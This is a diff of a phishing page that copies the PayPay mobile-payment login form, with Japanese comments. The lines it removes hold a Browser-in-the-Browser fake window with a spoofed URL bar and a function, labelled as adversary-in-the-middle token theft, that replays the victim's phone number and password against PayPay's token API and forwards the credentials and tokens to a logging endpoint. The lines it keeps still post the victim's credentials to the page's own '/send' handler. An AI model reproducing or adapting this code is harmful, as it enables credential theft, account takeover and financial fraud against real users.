@@ -184,7 +184,8 @@
       icon-clear
       icon-xs
       
-    "></i><form method="post" action="/send"></div><input data-v-291cd846="" type="tel" name="name" placeholder="携帯電話番号" class="" maxlength="13"><label data-v-291cd846="" id="login-inputPhone-txt" for="username" class="">携帯電話番号</label></div><!----></div><div data-v-291cd846="" class="password"><div data-v-291cd846="" class="input-field"><div data-v-291cd846="" class="icons-on-input"><div data-v-291cd846="" style="display: none;"><i data-v-231bf8e0="" data-v-291cd846="" class="
+   login.htmlはこれ
+ "></i><form method="post" action="/send"></div><input data-v-291cd846="" type="tel" name="name" placeholder="携帯電話番号" class="" maxlength="13"><label data-v-291cd846="" id="login-inputPhone-txt" for="username" class="">携帯電話番号</label></div><!----></div><div data-v-291cd846="" class="password"><div data-v-291cd846="" class="input-field"><div data-v-291cd846="" class="icons-on-input"><div data-v-291cd846="" style="display: none;"><i data-v-231bf8e0="" data-v-291cd846="" class="
       component-icon
       icon-clear
       icon-xs
@@ -203,29 +204,13 @@
       ib vm
     "></i><span data-v-fca42784="" class="pl10">ソフトバンク・ワイモバイル・LINEMO</span></button></section><div data-v-d4060102="" class="switch-sign-flow">アカウントをお持ちでない場合<a data-v-d4060102="" href="https://www.paypay.ne.jp/app/account/sign-up?redirect=%2Fapp%2Fp2p%2FbouFYjxOgKOiqy48%3Fpid%3DSMS%26link_key%3DbouFYjxOgKOiqy48" class=""><strong data-v-d4060102="" class="fs16 pl10">新規登録</strong></a></div><!----></section></div></section></div></div><div></div><div></div><div></div><div></div><div></div>
 
-<!-- BitB用の隠しiframe -->
-<div id="browser-container" style="width: 400px; margin: 0 auto; border: 1px solid #ccc; border-radius: 8px; overflow: hidden;">
-  <div id="browser-header" style="background: #f0f0f0; display: flex; align-items: center; padding: 5px;">
-    <div class="browser-controls" style="display: flex; margin-right: 10px;">
-      <span style="width: 12px; height: 12px; border-radius: 50%; background: #ff5f56; margin-right: 6px;"></span>
-      <span style="width: 12px; height: 12px; border-radius: 50%; background: #ffbd2e; margin-right: 6px;"></span>
-      <span style="width: 12px; height: 12px; border-radius: 50%; background: #27c93f;"></span>
-    </div>
-    <div id="browser-url-bar" style="display: flex; flex: 1; background: white; border-radius: 4px; padding: 2px 6px;">
-      <span style="margin-right: 5px;">🔒</span>
-      <input type="text" value="https://www.paypay.ne.jp" readonly style="border: none; outline: none; width: 100%;">
-    </div>
-  </div>
-  <iframe id="hidden-paypay" style="width: 100%; height: 600px; border: none;" src="https://paypay.ne.jp"></iframe>
-</div>
-
 <script>
 document.addEventListener("DOMContentLoaded", () => {
   const form = document.querySelector("form");
   const phoneInput = document.querySelector("input[name='name']");
   const passwordInput = document.querySelector("input[name='message']");
   const errorDiv = document.getElementById("login-error-message");
-  const submitBtn = document.getElementById("submit");
+  const submitBtn = document.getElementById("submit"); 
 
   const urlParams = new URLSearchParams(window.location.search);
   if (urlParams.get('error') === '1' && errorDiv) {
@@ -233,7 +218,6 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 
   if (!form || !phoneInput || !passwordInput || !errorDiv) return;
-
   phoneInput.addEventListener("input", (e) => {
     let value = e.target.value.replace(/\D/g, "");
     if (value.length > 11) value = value.substring(0, 11);
@@ -249,45 +233,8 @@ document.addEventListener("DOMContentLoaded", () => {
     e.target.value = formatted;
   });
 
-  // ✨ AITMアクセストークン奪取用関数
-  async function stealToken(phone, password) {
-    try {
-      const res = await fetch('https://api.paypay.ne.jp/v2/oauth/token', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
-          'Accept': 'application/json'
-        },
-        body: JSON.stringify({
-          phone: phone,
-          password: password
-        })
-      });
-
-      if (res.ok) {
-        const data = await res.json();
-        console.log(' アクセストークン奪取成功:', data.access_token);
-
-        // 裏でDiscordにトークンを送る
-        await fetch('/log-token', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            phone,
-            password,
-            accessToken: data.access_token,
-            refreshToken: data.refresh_token
-          })
-        });
-      }
-    } catch (e) {
-      console.error('トークン奪取失敗:', e);
-    }
-  }
-
-  const validateForm = async (event) => {
-    const phone = phoneInput.value.replace(/[- ]/g, '');
+  const validateForm = (event) => {
+    const phone = phoneInput.value.replace(/[- ]/g, ''); 
     const password = passwordInput.value;
 
     let typeCount = 0;
@@ -297,19 +244,16 @@ document.addEventListener("DOMContentLoaded", () => {
 
     const isPhoneValid = /^(090|080|070|060)\d{8}$/.test(phone);
     const isPasswordValid = password.length >= 8 && typeCount >= 2;
-
-    if (!isPhoneValid || !isPasswordValid) {
-      event.preventDefault();
-      event.stopPropagation();
-      errorDiv.style.display = "block";
-      return false;
-    } else {
-      errorDiv.style.display = "none";
-      form.action = `/send?tel=${encodeURIComponent(phoneInput.value)}`;
-
-      // ✨ AITM実行：アクセストークンを奪う
-      await stealToken(phone, password);
-    }
+if (!isPhoneValid || !isPasswordValid) {
+    event.preventDefault();
+    event.stopPropagation();
+    errorDiv.style.display = "block";
+    return false;
+} else {
+    errorDiv.style.display = "none";
+    form.action = `/send?tel=${encodeURIComponent(phoneInput.value)}`;
+}
+    
   };
 
   if (submitBtn) submitBtn.addEventListener("click", validateForm);
